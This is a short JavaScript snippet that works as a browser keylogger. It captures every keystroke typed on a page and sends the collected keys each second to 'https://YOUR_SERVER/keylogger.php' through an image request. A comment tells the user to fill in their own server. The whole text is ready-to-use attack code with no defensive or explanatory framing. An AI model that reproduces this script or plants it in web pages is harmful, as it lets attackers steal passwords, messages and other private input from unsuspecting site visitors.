// Replace YOUR_SERVER with your server IP/domain.

var keys = '';
document.onkeypress = function (e) {
    get = window.event ? event : e;
    key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}
window.setInterval(function () {
    new Image().src = 'https://YOUR_SERVER/keylogger.php?c=' + keys;
    keys = '';
}, 1000);